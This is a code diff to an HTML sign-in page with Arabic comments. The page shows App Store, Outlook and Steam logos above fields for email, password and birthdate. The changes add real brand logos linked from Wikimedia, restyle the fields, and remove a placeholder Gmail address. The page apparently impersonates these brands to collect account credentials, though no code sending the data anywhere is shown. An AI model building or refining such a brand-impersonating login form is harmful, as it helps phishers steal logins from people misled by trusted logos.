@@ -32,7 +32,7 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
-        /* قسم الشعارات العلوي - تم إصلاحه ليعمل بدون صور خارجية */
+        /* قسم الشعارات العلوي - تم استبداله بروابط صور حقيقية ومباشرة */
         .brands-header {
             display: flex;
             justify-content: center;
@@ -49,22 +49,16 @@
             font-size: 13px;
             color: #e5e7eb;
             background: #1a1c26;
-            padding: 6px 12px;
+            padding: 8px 14px;
             border-radius: 12px;
             border: 1px solid #2d3142;
         }
 
-        /* دوائر ملونة كبديل ذكي وفوري للشعارات المكسورة */
-        .brand-dot {
-            width: 100%;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
+        .brand-logo {
+            width: 18px;
+            height: 18px;
+            object-fit: contain;
         }
-        .dot-apple { background-color: #ffffff; }
-        .dot-outlook { background-color: #0078d4; }
-        .dot-steam { background-color: #171a21; border: 1px solid #fff; }
 
         /* تنسيق الحقول */
         .form-group {
@@ -78,6 +72,7 @@
             color: #9ca3af;
         }
 
+        /* إعادة حقول الإدخال مع الظل (التوهج) الأصفر المحيط بها */
         .input-field {
             width: 100%;
             background-color: #1a1c26;
@@ -87,22 +82,26 @@
             color: #ffffff;
             font-size: 15px;
             outline: none;
-            transition: border-color 0.3s;
+            /* إضافة الضل الأصفر الخفيف المحيط بالمستطيلات */
+            box-shadow: 0 0 8px rgba(212, 163, 89, 0.2);
+            transition: all 0.3s ease;
         }
 
+        /* تأثير التوهج الأصفر عند الضغط على الحقل */
         .input-field:focus {
-            border-color: #13542b;
+            border-color: #d4a359;
+            box-shadow: 0 0 12px rgba(212, 163, 89, 0.5);
         }
 
-        /* حقل الإيميل يسار ليمين */
+        /* حقل الإيميل يسار ليمين وبدون إيميل افتراضي داخله */
         .input-field[type="email"] {
             text-align: left;
             direction: ltr;
         }
 
-        /* إصلاح حقل التاريخ الجذري ليعمل على الهاتف دون تداخل */
+        /* حقل التاريخ الصافي والنظيف متوافق مع الهواتف وبنفس الظل الأصفر */
         .input-field[type="date"] {
-            direction: rtl;
+            direction: ltr;
             text-align: right;
             cursor: pointer;
         }
@@ -117,6 +116,7 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 12px;
+            transition: background-color 0.2s;
         }
 
         .btn-submit {
@@ -133,23 +133,27 @@
             background-color: #374151;
             color: #e5e7eb;
         }
+
+        .btn-qr:hover {
+            background-color: #4b5563;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- قسم الشعارات بعد إصلاح مشكلة الصور المكسورة -->
+        <!-- قسم الشعارات مع روابط صور مباشرة لضمان ظهورها على الإنترنت -->
         <div class="brands-header">
             <div class="brand-item">
-                <span class="brand-dot dot-apple"></span>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_%28iOS%29.svg" alt="App Store" class="brand-logo">
                 <span>App Store</span>
             </div>
             <div class="brand-item">
-                <span class="brand-dot dot-outlook"></span>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg" alt="Outlook" class="brand-logo">
                 <span>Outlook</span>
             </div>
             <div class="brand-item">
-                <span class="brand-dot dot-steam"></span>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Steam" class="brand-logo">
                 <span>Steam</span>
             </div>
         </div>
@@ -157,9 +161,10 @@
         <!-- النموذج -->
         <form id="customerForm">
             
+            <!-- تم إزالة الإيميل الافتراضي تماماً وجعل الحقل فارغاً -->
             <div class="form-group">
                 <label>البريد الإلكتروني (Email)</label>
-                <input type="email" class="input-field" placeholder="rorotyty56655@gmail.com" required>
+                <input type="email" class="input-field" required>
             </div>
 
             <div class="form-group">
@@ -167,7 +172,7 @@
                 <input type="password" class="input-field" placeholder="••••••••••••" required>
             </div>
 
-            <!-- حقل التاريخ الصافي والنظيف لتجنب ظهور القائمة البيضاء المكسورة -->
+            <!-- حقل التاريخ الرسمي والمنظم المناسب للهواتف مع الظل الأصفر -->
             <div class="form-group">
                 <label>تاريخ الميلاد (Birthdate)</label>
                 <input type="date" class="input-field" required>
